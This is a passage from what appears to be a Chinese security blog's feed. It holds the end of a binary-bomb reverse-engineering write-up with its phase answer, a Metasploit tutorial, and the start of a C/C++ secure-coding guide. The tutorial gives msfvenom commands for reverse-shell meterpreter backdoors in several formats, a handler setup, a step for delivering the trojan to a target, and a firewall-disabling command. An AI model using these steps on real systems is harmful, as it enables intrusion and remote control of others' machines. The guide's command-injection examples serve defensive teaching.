punctuation">;</span> <span class="token punctuation">;</span> count<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> count<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">push</span><span class="token punctuation">(</span>nod<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            nod <span class="token operator">=</span> nod<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得到它的逻辑是，<strong>根据arr[k]的值，让序列为这个值的node入栈，例如arr[0] = 6,则循环遍历到node6让其入栈</strong>，根据Part-3我们的数组值变为了<code>6 5 4 3 2 1</code>，所以我们入栈的node序列为<code>node6 node5 node4 node3 node2 node1</code></p><p>查看内存得知，node1-node6的weight 权重分别为：<code>332，168，924，691，477，443</code></p><h2 id="Part-5"><a href="#Part-5" class="headerlink" title="Part-5"></a>Part-5</h2><p>将入栈后的node按入栈顺序链接起来</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>nod<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">-&gt;</span>next <span class="token operator">=</span> nod<span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Part-6"><a href="#Part-6" class="headerlink" title="Part-6"></a>Part-6</h2><p>判断入栈的nod序列的weight是否是从大到小排序的，如果不是（例如 nod1.weight &lt; nod2.weight），则炸弹爆炸</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>con <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> con <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span>con<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>nod<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">&lt;</span> nod<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>weight<span class="token punctuation">)</span>        <span class="token function">bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>所以输入的数字顺序应该按照<code>node.weight</code>的从大到小来输入，因为Part-4中我们知道它会把我们输入的数字按从大到小的顺序来将链表压入栈中，所以weight最大的位置应该放6，第二大的位置放5，即weight大小的位置与value大小一一对应。</p><p>weight：<code>332，168，924，691，477，443</code>  对应 <code>1 2 3 4 5 6</code></p><p>用7减过后的value:<code>     3 ， 4  ，5 ， 6 ， 1 ， 2</code></p><p>又因为它还要用7减去我们输入的数，我们我们输入的数应该是用7减之前的。</p><p>所以最终应该输入的value:<code>4 3 2 1 6 5</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全,逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF</title>
      <link href="/2022/05/12/web-an-quan/msf/"/>
      <url>/2022/05/12/web-an-quan/msf/</url>
      
        <content type="html"><![CDATA[<h1 id="MSF介绍与实战"><a href="#MSF介绍与实战" class="headerlink" title="MSF介绍与实战"></a>MSF介绍与实战</h1><h2 id="1、它是一个渗透测试框架（模块介绍）"><a href="#1、它是一个渗透测试框架（模块介绍）" class="headerlink" title="1、它是一个渗透测试框架（模块介绍）"></a>1、它是一个渗透测试框架（模块介绍）</h2><ul><li><strong><code>auxiliary</code></strong>:辅助模块，辅助渗透（端口扫描、登陆密码爆破、漏洞验证等）</li><li><strong><code>exploits(exp)</code></strong>:漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。</li><li><strong>命名规则</strong>：操作系统/各种应用协议分类</li><li><strong><code>payloads</code></strong>:攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹shell的代码</li><li><strong><code>post</code></strong>:后渗透阶段模块，漏洞利用成功获得meteroreter之后，向目标发送的一些功能性指令,如提权等。</li><li><strong><code>encoders</code></strong>:编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统。</li><li><code>evasion</code>：躲避模块，用来生成免杀payload</li><li><strong><code>nops</code></strong>:由于IDS/IPS会检查数据包中不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串（NOPS x90x90）则会因为被拦截而导致攻击失效。</li></ul><h2 id="2、基本命令"><a href="#2、基本命令" class="headerlink" title="2、基本命令"></a>2、基本命令</h2><ul><li><p>​    <code>msfconsole</code>       启动msf</p></li><li><p>​    <code>db_nmap</code>: nmap扫描</p></li></ul><p><img src="/2022/05/12/web-an-quan/msf/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.png"></p><h2 id="3、后渗透"><a href="#3、后渗透" class="headerlink" title="3、后渗透"></a>3、后渗透</h2><p>后渗透可以做些什么呢？</p><p><img src="/2022/05/12/web-an-quan/msf/%E5%90%8E%E6%B8%97%E9%80%8F%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BA%9B%E4%BB%80%E4%B9%88.png"></p><ul><li>​    在进入目标主机之后，通过background命令把它放在后台，然后输入sessions（后台）可以发现后台出现了一个id为1的进程；然后输入命令sessions -u(upgrade升级) 1(id) 来把它升级为meterpreter模块来进行后渗透。</li><li>​    然后输入命令sessions 发现多了一个id为2的后台，那就是meterpreter模块，然后输入命令sessions 2来进入后渗透模块。</li></ul><p><img src="/2022/05/12/web-an-quan/msf/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.png"></p><h2 id="4、msfvenom生成后门木马"><a href="#4、msfvenom生成后门木马" class="headerlink" title="4、msfvenom生成后门木马"></a>4、msfvenom生成后门木马</h2><ul><li>​    <code>msfvenom</code>是<code>msfpayload</code>和<code>msfencode</code>的组合。将这两个工具集成在一个框架实例中。</li><li>​    <code>msfvenom</code>是用来生成后门的软件，在目标机上执行后门，在本地监听上线。</li></ul><ol><li><p>生成后门：</p><ul><li>  <code>windows:msfvenom -p windows/meterpreter(要生成的模块)/reverse(反弹)_tcp lhost=攻击机(自己)的ip地址 lport=攻击机所开启监听的端口号 -f(要输出的文件格式)exe -o(output输出)shell.exe</code></li></ul></li></ol><ul><li>  ​       <code>php :msfvenom -p php/meterpreter(要生成的模块)/reverse(反弹)_tcp lhost=攻击机(自己)的ip地址 lport=攻击机所开启监听的端口号 -f(要输出的文件格式)raw(未经处理的文件) -o(output输出)shell.php</code></li><li>  ​      <code>python:msfvenom -p python/meterpreter(要生成的模块)/reverse(反弹)_tcp lhost=攻击机(自己)的ip地址 lport=攻击机所开启监听的端口号 -f(要输出的文件格式)raw -o(output输出)shell.py</code></li></ul><p>   <img src="/2022/05/12/web-an-quan/msf/msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8.png"></p><ol start="2"><li><p>然后把生成的后门木马文件发送给目标主机，让它点击运行。</p></li><li><p>然后在攻击机开启一个监听:输入命令 <code>use exploit/multi/handler(监听)</code> </p></li><li><p>然后设置刚刚生成后门木马的payload：输入命令 </p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">set payload winows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>然后设置监听ip地址（攻击机(本机)的ip地址）set lhost 攻击机ip</p></li><li><p>再设置监听端口:  set lport 生成后门木马时攻击机所开放的端口</p></li><li><p>然后开启监听：输入命令 run 或 exploit   只要对方点击了木马文件就可对它进行监听了。 </p></li><li><p>成功监听后可输入命令 background 来把它放在后台，然后再输入命令 sessions 来查看后台的进程，然后可以输入命令 sessions id 来把它调到前台。</p></li></ol><ul><li><p>由于liunx与windows编码方式不同，我们进入靶机shell后可以调编码    <code>chcp 65001</code></p></li><li><p>关闭防火墙命令: </p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">netsh firewall set opmode mode=disable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c,c++安全指南</title>
      <link href="/2022/04/09/dai-ma-an-quan-yu-shen-ji/c-c-an-quan-zhi-nan/"/>
      <url>/2022/04/09/dai-ma-an-quan-yu-shen-ji/c-c-an-quan-zhi-nan/</url>
      
        <content type="html"><![CDATA[<details markdown="1">  <summary>目录</summary><ul><li><a href="#1">1 通用安全指南</a><ul><li><a href="#1.1">I. C/C++使用错误</a><ul><li>  <a href="#1.1.1">1.1 不得直接使用无长度限制的字符拷贝函数</a></li><li>  <a href="#1.1.2">1.2 创建进程类的函数的安全规范</a></li><li>  <a href="#1.1.3">1.3 尽量减少使用 _alloca 和可变长度数组</a></li><li>  <a href="#1.1.4">1.4 printf系列参数必须对应</a></li><li>  <a href="#1.1.5">1.5 防止泄露指针（包括%p）的值</a></li><li>  <a href="#1.1.6">1.6 不应当把用户可修改的字符串作为printf系列函数的“format”参数</a></li><li>  <a href="#1.1.7">1.7 对数组delete时需要使用delete[]</a></li><li>  <a href="#1.1.8">1.8 注意隐式符号转换</a></li><li>  <a href="#1.1.9">1.9 注意八进制问题</a></li></ul></li><li><a href="#1.2">II. 不推荐的编程习惯</a><ul><li>  <a href="#1.2.1">2.1 switch中应有default</a></li><li>  <a href="#1.2.2">2.2 不应当在Debug或错误信息中提供过多内容</a></li><li>  <a href="#1.2.3">2.3 不应该在客户端代码中硬编码对称加密秘钥</a></li><li>  <a href="#1.2.4">2.4 返回栈上变量的地址</a></li><li>  <a href="#1.2.5">2.5 有逻辑联系的数组必须仔细检查</a></li><li>  <a href="#1.2.6">2.6 避免函数的声明和实现不同</a></li><li>  <a href="#1.2.7">2.7 检查复制粘贴的重复代码</a></li><li>  <a href="#1.2.8">2.8 左右一致的重复判断/永远为真或假的判断</a></li><li>  <a href="#1.2.9">2.9 函数每个分支都应有返回值</a></li><li>  <a href="#1.2.10">2.10 不得使用栈上未初始化的变量</a></li><li>  <a href="#1.2.11">2.11 不得直接使用刚分配的未初始化的内存（如realloc）</a></li><li>  <a href="#1.2.12">2.12 校验内存相关函数的返回值</a></li><li>  <a href="#1.2.13">2.13 不要在if里面赋值</a></li><li>  <a href="#1.2.14">2.14 确认if里面的按位操作</a></li></ul></li><li><a href="#1.3">III. 多线程</a><ul><li>  <a href="#1.3.1">3.1 变量应确保线程安全性</a> </li><li>  <a href="#1.3.2">3.2 注意signal handler导致的条件竞争</a> </li><li>  <a href="#1.3.3">3.3 注意Time-of-check Time-of-use条件竞争</a></li></ul></li><li><a href="#1.4">IV. 加密解密</a><ul><li>  <a href="#1.4.1">4.1 不得明文存储用户密码等敏感数据</a> </li><li>  <a href="#1.4.2">4.2 内存中的用户密码等敏感数据应该安全抹除</a> </li><li>  <a href="#1.4.3">4.3 rand() 类函数应正确初始化</a></li><li>  <a href="#1.4.4">4.4 在需要高强度安全加密时不应使用弱PRNG函数</a></li><li>  <a href="#1.4.5">4.5 自己实现的rand范围不应过小</a></li></ul></li><li><a href="#1.5">V. 文件操作</a><ul><li>  <a href="#1.5.1">5.1 避免路径穿越问题</a></li><li>  <a href="#1.5.2">5.2 避免相对路径导致的安全问题</a></li><li>  <a href="#1.5.3">5.3 文件权限控制</a></li></ul></li><li><a href="#1.6">Ⅵ. 内存操作</a><ul><li>  <a href="#1.6.1">6.1 防止各种越界写</a></li><li>  <a href="#1.6.2">6.2 防止任意地址写</a></li></ul></li><li><a href="#1.7">Ⅶ. 数字操作</a><ul><li>  <a href="#1.7.1">7.1 防止整数溢出</a></li><li>  <a href="#1.7.2">7.2 防止Off-By-One</a></li><li>  <a href="#1.7.3">7.3 避免大小端错误</a></li><li>  <a href="#1.7.4">7.4 检查除以零异常</a></li><li>  <a href="#1.7.5">7.5 防止数字类型的错误强转</a></li><li>  <a href="#1.7.6">7.6 比较数据大小时加上最小/最大值的校验</a></li></ul></li><li><a href="#1.8">Ⅷ. 指针操作</a><ul><li>  <a href="#1.8.1">8.1 检查在pointer上使用sizeof</a> </li><li>  <a href="#1.8.2">8.2 检查直接将数组和0比较的代码</a> </li><li>  <a href="#1.8.3">8.3 不应当向指针赋予写死的地址</a></li><li>  <a href="#1.8.4">8.4 检查空指针</a></li><li>  <a href="#1.8.5">8.5 释放完后置空指针</a></li><li>  <a href="#1.8.6">8.6 防止错误的类型转换</a></li><li><a href="#1.8.7">8.7 智能指针使用安全</a>  </li></ul></li></ul></li></ul></details><p><a id="1"></a></p><h2 id="通用安全指南"><a href="#通用安全指南" class="headerlink" title="通用安全指南"></a>通用安全指南</h2><p><a id="1.1"></a></p><h3 id="1-C-C-使用错误"><a href="#1-C-C-使用错误" class="headerlink" title="1.C/C++使用错误"></a>1.C/C++使用错误</h3><p><a id="1.1.1"></a></p><h4 id="1-1-【必须】不得直接使用无长度限制的字符拷贝函数"><a href="#1-1-【必须】不得直接使用无长度限制的字符拷贝函数" class="headerlink" title="1.1  【必须】不得直接使用无长度限制的字符拷贝函数"></a>1.1  【必须】不得直接使用无长度限制的字符拷贝函数</h4><p>不应直接使用legacy的字符串拷贝、输入函数，如strcpy、strcat、sprintf、wcscpy、mbscpy等，这些函数的特征是：可以输出一长串字符串，而不限制长度。如果环境允许，应当使用其_s安全版本替代，或者使用n版本函数（如：snprintf，vsnprintf）。</p><p>若使用形如sscanf之类的函数时，在处理字符串输入时应当通过%10s这样的方式来严格限制字符串长度，同时确保字符串末尾有\0。如果环境允许，应当使用_s安全版本。</p><p>但是注意，虽然MSVC 2015时默认引入结尾为0版本的<code>snprintf</code>（行为等同于C99定义的<code>snprintf</code>）。但更早期的版本中，MSVC的<code>snprintf</code>可能是<code>_snprintf</code>的宏。而<code>_snprintf</code>是不保证\0结尾的（见本节后半部分）。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">（MSVC）Beginning with the UCRT in Visual Studio 2015 and Windows 10, snprintf is no longer identical to _snprintf. The snprintf function behavior is now C99 standard compliant.从Visual Studio 2015和Windows 10中的UCRT开始，snprintf不再与_snprintf相同。snprintf函数行为现在符合C99标准。请参考：https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/snprintf-snprintf-snprintf-l-snwprintf-snwprintf-l?redirectedfrom=MSDN&amp;view=vs-2019<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，在使用n系列拷贝函数时，要确保正确计算缓冲区长度，同时，如果你不确定是否代码在各个编译器下都能确保末尾有0时，建议可以适当增加1字节输入缓冲区，并将其置为\0，以保证输出的字符串结尾一定有\0。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodchar buf[101] = {0};snprintf(buf, sizeof(buf) - 1, "foobar ...", ...);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一些需要注意的函数，例如<code>strncpy</code>和<code>_snprintf</code>是不安全的。 <code>strncpy</code>不应当被视为<code>strcpy</code>的n系列函数，它只是恰巧与其他n系列函数名字很像而已。<code>strncpy</code>在复制时，如果复制的长度超过n，不会在结尾补\0。</p><p>同样，MSVC <code>_snprintf</code>系列函数在超过或等于n时也不会以0结尾。如果后续使用非0结尾的字符串，可能泄露相邻的内容或者导致程序崩溃。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badchar a[4] = {0};_snprintf(a, 4, "%s", "AAAA");foo = strlen(a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码在MSVC中执行后， a[4] == ‘A’，因此字符串未以0结尾。a的内容是”AAAA”，调用<code>strlen(a)</code>则会越界访问。因此，正确的操作举例如下：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodchar a[4] = {0};_snprintf(a, sizeof(a), "%s", "AAAA");a[sizeof(a) - 1] = '\0';foo = strlen(a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 C++ 中，强烈建议用 <code>string</code>、<code>vector</code> 等更高封装层次的基础组件代替原始指针和动态数组，对提高代码的可读性和安全性都有很大的帮助。</p><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><code>低风险-拒绝服务</code></p><p><code>高风险-缓冲区溢出</code></p><p><a id="1.1.2"></a></p><h4 id="1-2-【必须】创建进程类的函数的安全规范"><a href="#1-2-【必须】创建进程类的函数的安全规范" class="headerlink" title="1.2  【必须】创建进程类的函数的安全规范"></a>1.2  【必须】创建进程类的函数的安全规范</h4><p>system、WinExec、CreateProcess、ShellExecute等启动进程类的函数，需要严格检查其参数。</p><p>启动进程需要加上双引号，错误例子：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// BadWinExec("D:\\program files\\my folder\\foobar.exe", SW_SHOW);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当存在<code>D:\program files\my.exe</code>的时候，my.exe会被启动。而foobar.exe不会启动。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// GoodWinExec("\"D:\\program files\\my folder\\foobar.exe\"", SW_SHOW);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>另外，如果启动时从用户输入、环境变量读取组合命令行时，还需要注意是否可能存在命令注入。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badstd::string cmdline = "calc ";cmdline += user_input;system(cmdline.c_str());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>比如，当用户输入<code>1+1 &amp;&amp; ls</code>时，执行的实际上是calc 1+1和ls 两个命令，导致命令注入。</p><p>需要检查用户输入是否含有非法数据。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodstd::string cmdline = "ls ";cmdline += user_input;if(cmdline.find_first_not_of("1234567890.+-*/e ") == std::string::npos)  system(cmdline.c_str());else  warning(...);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-代码执行</code></p><p><code>高风险-权限提升</code></p><p><a id="1.1.3"></a></p><h4 id="1-3-【必须】尽量减少使用-alloca-和可变长度数组"><a href="#1-3-【必须】尽量减少使用-alloca-和可变长度数组" class="headerlink" title="1.3  【必须】尽量减少使用 _alloca 和可变长度数组"></a>1.3  【必须】尽量减少使用 _alloca 和可变长度数组</h4><p>_alloca 和<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E5%8F%98%E9%95%BF%E6%95%B0%E7%BB%84">可变长度数组</a>使用的内存量在编译期间不可知。尤其是在循环中使用时，根据编译器的实现不同，可能会导致：（1）栈溢出，即拒绝服务； （2）缺少栈内存测试的编译器实现可能导致申请到非栈内存，并导致内存损坏。这在栈比较小的程序上，例如IoT设备固件上影响尤为大。对于 C++，可变长度数组也属于非标准扩展，在代码规范中禁止使用。</p><p>错误示例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badfor (int i = 0; i &lt; 100000; i++) {  char* foo = (char *)_alloca(0x10000);  ..do something with foo ..;}void Foo(int size) {  char msg[size]; // 不可控的栈溢出风险！}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确示例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Good// 改用动态分配的堆内存for (int i = 0; i &lt; 100000; i++) {  char * foo = (char *)malloc(0x10000);  ..do something with foo ..;  if (foo_is_no_longer_needed) {    free(foo);    foo = NULL;  }}void Foo(int size) {  std::string msg(size, '\0');  // C++  char* msg = malloc(size);  // C}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>低风险-拒绝服务</code></p><p><code>高风险-内存破坏</code></p><p><a id="1.1.4"></a></p><h4 id="1-4-【必须】printf系列参数必须对应"><a href="#1-4-【必须】printf系列参数必须对应" class="headerlink" title="1.4  【必须】printf系列参数必须对应"></a>1.4  【必须】printf系列参数必须对应</h4><p>所有printf系列函数，如sprintf，snprintf，vprintf等必须对应控制符号和参数。</p><p>错误示例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badconst int buf_size = 1000;char buffer_send_to_remote_client[buf_size] = {0};snprintf(buffer_send_to_remote_client, buf_size, "%d: %p", id, some_string);  // %p 应为 %sbuffer_send_to_remote_client[buf_size - 1] = '\0';send_to_remote(buffer_send_to_remote_client);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确示例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodconst int buf_size = 1000;char buffer_send_to_remote_client[buf_size] = {0};snprintf(buffer_send_to_remote_client, buf_size, "%d: %s", id, some_string);buffer_send_to_remote_client[buf_size - 1] = '\0';send_to_remote(buffer_send_to_remote_client);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前者可能会让client的攻击者获取部分服务器的原始指针地址，可以用于破坏ASLR保护。</p><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><a id="1.1.5"></a></p><h4 id="1-5-【必须】防止泄露指针（包括-p）的值"><a href="#1-5-【必须】防止泄露指针（包括-p）的值" class="headerlink" title="1.5  【必须】防止泄露指针（包括%p）的值"></a>1.5  【必须】防止泄露指针（包括%p）的值</h4><p>所有printf系列函数，要防止格式化完的字符串泄露程序布局信息。例如，如果将带有%p的字符串泄露给程序，则可能会破坏ASLR的防护效果。使得攻击者更容易攻破程序。</p><p>%p的值只应当在程序内使用，而不应当输出到外部或被外部以某种方式获取。</p><p>错误示例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Bad// 如果这是暴露给客户的一个API：uint64_t GetUniqueObjectId(const Foo* pobject) {  return (uint64_t)pobject;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确示例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Gooduint64_t g_object_id = 0;void Foo::Foo() {  this-&gt;object_id_ = g_object_id++;}// 如果这是暴露给客户的一个API：uint64_t GetUniqueObjectId(const Foo* object) {  if (object)    return object-&gt;object_id_;  else    error(...);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><a id="1.1.6"></a></p><h4 id="1-6-【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数"><a href="#1-6-【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数" class="headerlink" title="1.6  【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数"></a>1.6  【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数</h4><p>如果用户可以控制字符串，则通过 %n %p 等内容，最坏情况下可以直接执行任意恶意代码。</p><p>在以下情况尤其需要注意： WIFI名，设备名……</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">snprintf(buf, sizeof(buf), wifi_name);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">snprinf(buf, sizeof(buf), "%s", wifi_name);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-代码执行</code></p><p><code>高风险-内存破坏</code></p><p><code>中风险-信息泄露</code></p><p><code>低风险-拒绝服务</code></p><p><a id="1.1.7"></a></p><h4 id="1-7-【必须】对数组delete时需要使用delete"><a href="#1-7-【必须】对数组delete时需要使用delete" class="headerlink" title="1.7 【必须】对数组delete时需要使用delete[]"></a>1.7 【必须】对数组delete时需要使用delete[]</h4><p>delete []操作符用于删除数组。delete操作符用于删除非数组对象。它们分别调用operator delete[]和operator delete。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// BadFoo* b = new Foo[5];delete b;  // trigger assert in DEBUG mode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在new[]返回的指针上调用delete将是取决于编译器的未定义行为。代码中存在对未定义行为的依赖是错误的。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// GoodFoo* b = new Foo[5];delete[] b;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在 C++ 代码中，使用 <code>string</code>、<code>vector</code>、智能指针（比如<a href="https://zh.cppreference.com/w/cpp/memory/unique_ptr">std::unique_ptr&lt;T[]&gt;</a>）等可以消除绝大多数 <code>delete[]</code> 的使用场景，并且代码更清晰。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑漏洞</code></p><p><code>低风险-内存泄漏</code></p><p><code>低风险-拒绝服务</code></p><p><a id="1.1.8"></a></p><h4 id="1-8【必须】注意隐式符号转换"><a href="#1-8【必须】注意隐式符号转换" class="headerlink" title="1.8【必须】注意隐式符号转换"></a>1.8【必须】注意隐式符号转换</h4><p>两个无符号数相减为负数时，结果应当为一个很大的无符号数，但是小于int的无符号数在运算时可能会有预期外的隐式符号转换。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// 1unsigned char a = 1;unsigned char b = 2;if (a - b &lt; 0)  // a - b = -1 (signed int)  a = 6;else  a = 8;// 2unsigned char a = 1;unsigned short b = 2;if (a - b &lt; 0)  // a - b = -1 (signed int)  a = 6;else  a = 8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述结果均为a=6</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// 3unsigned int a = 1;unsigned short b = 2;if (a - b &lt; 0)  // a - b = 0xffffffff (unsigned int)  a = 6;else  a = 8;  // 4unsigned int a = 1;unsigned int b = 2;if (a - b &lt; 0)  // a - b = 0xffffffff (unsigned int)  a = 6;else  a = 8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述结果均为a=8</p><p>如果预期为8，则错误代码：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badunsigned short a = 1;unsigned short b = 2;if (a - b &lt; 0)  // a - b = -1 (signed int)  a = 6;else  a = 8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确代码：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodunsigned short a = 1;unsigned short b = 2;if ((unsigned int)a - (unsigned int)b &lt; 0)  // a - b = 0xffff (unsigned short)  a = 6;else  a = 8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.1.9"></a></p><h4 id="1-9【必须】注意八进制问题"><a href="#1-9【必须】注意八进制问题" class="headerlink" title="1.9【必须】注意八进制问题"></a>1.9【必须】注意八进制问题</h4><p>代码对齐时应当使用空格或者编辑器自带的对齐功能，谨慎在数字前使用0来对齐代码，以免不当将某些内容转换为八进制。</p><p>例如，如果预期为20字节长度的缓冲区，则下列代码存在错误。buf2为020（OCT）长度，实际只有16（DEC）长度，在memcpy后越界：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badchar buf1[1024] = {0};char buf2[0020] = {0};memcpy(buf2, somebuf, 19);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应当在使用8进制时明确注明这是八进制。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodint access_mask = 0777;  // oct, rwxrwxrwx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.2"></a></p><h3 id="2-不推荐的编程习惯"><a href="#2-不推荐的编程习惯" class="headerlink" 